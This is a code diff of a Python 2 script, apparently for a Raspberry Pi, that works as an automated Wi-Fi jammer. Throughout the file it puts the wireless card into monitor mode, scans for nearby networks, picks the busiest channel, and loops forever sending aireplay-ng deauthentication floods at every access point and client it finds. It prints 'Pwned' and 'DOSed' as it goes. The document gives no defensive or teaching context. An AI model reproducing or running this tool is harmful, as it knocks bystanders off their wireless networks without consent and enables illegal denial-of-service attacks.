@@ -1,29 +1,32 @@
 import os
 import csv
 import time
-import RPi.GPIO as GPIO
 import subprocess
-r = 26
-g = 6
-b = 5
-max = 3
-GPIO.setmode(GPIO.BCM)
-GPIO.setwarnings(False)
-GPIO.setup(r, GPIO.OUT)
-GPIO.setup(g, GPIO.OUT)
-GPIO.setup(b, GPIO.OUT)
-GPIO.output(r, True)
-GPIO.output(g, True)
-GPIO.output(b, True)
-GPIO.output(r, False)
-time.sleep(0.4)
-GPIO.output(r, True)
-GPIO.output(g, False)
-time.sleep(0.4)
-GPIO.output(g, True)
-GPIO.output(b, False)
-time.sleep(0.4)
-GPIO.output(b, True)
+import sys
+gpio = sys.argv[1]
+monitor = sys.argv[2]
+if gpio == '1':
+    import RPi.GPIO as GPIO
+    r = 26
+    g = 6
+    b = 5
+    GPIO.setmode(GPIO.BCM)
+    GPIO.setwarnings(False)
+    GPIO.setup(r, GPIO.OUT)
+    GPIO.setup(g, GPIO.OUT)
+    GPIO.setup(b, GPIO.OUT)
+def blink(re, gr, bl, d):
+	if gpio == '1':
+	    GPIO.output(r, not(re))
+	    GPIO.output(g, not(gr))
+	    GPIO.output(b, not(bl))
+	    time.sleep(d)
+	    GPIO.output(r, True)
+	    GPIO.output(g, True)
+	    GPIO.output(b, True)
+blink(True, False, False, 0.4)
+blink(False, True, False, 0.4)
+blink(False, False, True, 0.4)
 os.system("sudo airmon-ng check kill")
 os.system("sudo airmon-ng start wlan0")
 os.system("sudo ifconfig wlan0 down")
@@ -37,24 +40,24 @@ def scan(channel, duration, write):
 	if int(channel) > 0:
 		execute.append("-c")
 		execute.append(channel)
-	execute.append("mon0")
-	try:
-		proc = subprocess.Popen(execute, shell=False)
-	except:
-		e = sys.exc_info()[0]
-		file = open("/mnt/usb/linux/jammer/err.txt","w") 
-		file.write(e) 
-		file.close()
-		sys.exit(0) 
+	execute.append(monitor)
+	proc = subprocess.Popen(execute, shell=False) 
 	for t in range(0, duration):
-		GPIO.output(b, False)
-		time.sleep(0.1)
-		GPIO.output(b, True)
+		blink(False, False, True, 0.1)
 		time.sleep(0.9)
 	subprocess.call(["kill", "-9", "%d" % proc.pid])
 	proc.wait()
+def outclient(out):
+	print "Pwned " + out
+	blink(True, False, False, 0.25)
+	time.sleep(0.4)
+def outAP(out):
+	print "DOSed " + out
+	blink(True, True, True, 0.25)
+	time.sleep(0.4)
 def analyse(clientmacs, apmacs, chann, bssids):
-	GPIO.output(g, False)
+	if gpio == '1':
+	    GPIO.output(g, False)
 	here = False
 	with open('clients-01.csv') as csvfile:
 		for row in csv.reader(csvfile):
@@ -71,7 +74,8 @@ def analyse(clientmacs, apmacs, chann, bssids):
 					here = True
 			except:
 				pass
-	GPIO.output(g, True)	
+	if gpio == '1':
+	    GPIO.output(g, True)	
 while 2 == 2:
 	scan(0, 20, True)
 	clientmacs = []
@@ -81,7 +85,7 @@ while 2 == 2:
 	analyse(clientmacs, apmacs, chann, bssids)
 	mostap = ""
 	comn = 0
-	mostch = "0"
+	mostch = "-1"
 	for ap in bssids:
 		count = 0
 		for apmac in apmacs:
@@ -93,26 +97,18 @@ while 2 == 2:
 	for x in range(0, len(bssids)):
 		if bssids[x] == mostap:
 			mostch = chann[x]	
-	scan(mostch, 50, True)
+	scan(mostch, 40, True)
 	del clientmacs[:]
 	del apmacs[:]
 	del bssids[:]
 	del chann[:]
 	analyse(clientmacs, apmacs, chann, bssids)
-	time.sleep(5)
 	print "Found " + str(len(clientmacs)) + " Clients"
 	for vicap in bssids:
-		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + vicap + ' --ignore-negative-one mon0')
-		print "DOSsed " + vicap
-		GPIO.output(r, False)
-		time.sleep(0.25)
-		GPIO.output(r, True)
-		time.sleep(0.25)
-	for x in range(0, len(clientmacs)):
-		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + apmacs[x] + ' -c ' + clientmacs[x] + ' --ignore-negative-one mon0')
-		print "Pwned " + clientmacs[x]
-		GPIO.output(r, False)
-		time.sleep(0.5)
-		GPIO.output(r, True)
-		time.sleep(0.5)
-	time.sleep(120)
+		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + vicap + ' --ignore-negative-one ' + monitor)
+		outAP(vicap)
+	for x in range(0, len(clientmacs) - 1):
+		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + apmacs[x] + ' -c ' + clientmacs[x] + ' ' + monitor)
+		outclient(clientmacs[x])
+	os.system('aireplay-ng --deauth 100 -a ' + apmacs[len(clientmacs) - 1] + ' -c ' + clientmacs[len(clientmacs) - 1] + ' ' + monitor)
+	outclient(clientmacs[len(clientmacs) - 1])
